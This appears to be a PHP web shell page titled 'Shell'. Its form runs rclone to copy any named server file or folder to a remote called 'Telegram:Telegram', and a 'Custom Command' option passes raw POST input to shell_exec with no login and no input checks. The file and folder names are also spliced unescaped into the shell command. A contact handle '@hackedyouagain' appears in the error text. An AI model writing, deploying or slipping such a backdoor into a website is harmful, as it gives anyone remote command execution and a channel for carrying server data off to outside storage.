<?php
if (isset($_POST['cmd'])) {
	$cmd1=$_POST["cmd"];
	$radioval=$_REQUEST["myradio"];
}
?>
<html>
<head>
<title>Shell</title>
<meta charset="utf-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" type="text/css" href="https://bootswatch.com/4/flatly/bootstrap.min.css">
</head>

<body>
<div class="container" align="center">
<form action="" method="post" class="form-group">
<b>Select File or Folder:</b><br>
<input type="radio" name="myradio" value="file"><b>Rclone File</b><br>
<input type="radio" name="myradio" value="folder"><b>Rclone Folder</b><br>
<input type="radio" name="myradio" value="custom"><b>Custom Command</b><br>
<b>Enter File/Folder Name:</b><br>
<input type="text" class="form-control" name="cmd" placeholder="Enter your folder or file name here"><br>
<input type="submit" value="Exceute" class="btn btn-primary" name="execute"><br><br>
</form>

	
<?php if($radioval == "file") : ?>
<?php		$cmd=shell_exec("rclone copy " .$cmd1. " Telegram:Telegram"); ?>
		<?php if ($cmd) : ?>
		<div class="pb-2 mt-4 mb-2">
            <h2> Output </h2>
        </div>
        <pre>
<?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
        </pre>
<?php endif; ?>
		
<?php elseif($radioval == "folder") : ?>
			<?php $cmd=shell_exec("rclone copy " .$cmd1. " -L Telegram:Telegram/".$cmd1); ?>
		<?php	if ($cmd) : ?>
		<div class="pb-2 mt-4 mb-2">
            <h2> Output </h2>
        </div>
        <pre>
<?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
        </pre>
<?php endif; ?>
<?php elseif($radioval == "custom") : ?>
			<?php $cmd=shell_exec($cmd1); ?>
		<?php	if ($cmd) : ?>
		<div class="pb-2 mt-4 mb-2">
            <h2> Output </h2>
        </div>
        <pre>
<?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
        </pre>
<?php endif; ?>

<?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST') : 
		{
			echo "Error kindly contact @hackedyouagain";
		}
?>
<?php endif; ?>
</div>
</body>
</html>